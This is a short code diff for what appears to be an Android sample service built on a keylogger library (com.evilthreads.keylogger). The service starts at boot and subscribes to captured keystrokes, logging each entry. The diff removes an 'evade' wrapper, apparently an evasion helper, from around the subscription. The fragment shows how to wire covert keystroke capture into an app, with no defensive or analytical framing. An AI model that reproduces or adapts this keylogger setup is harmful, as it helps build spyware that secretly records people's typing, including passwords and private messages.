@@ -28,11 +28,9 @@ import com.evilthreads.keylogger.Keylogger
 */
 class MyService: BootService() {
     init {
-        evade {
-            lifecycleScope.launchWhenCreated {
-                Keylogger.subscribe { entry ->
-                    Log.d("KEYLOGGER", entry.toString())
-                }
+        lifecycleScope.launchWhenCreated {
+            Keylogger.subscribe { entry ->
+                Log.d("KEYLOGGER", entry.toString())
             }
         }
     }
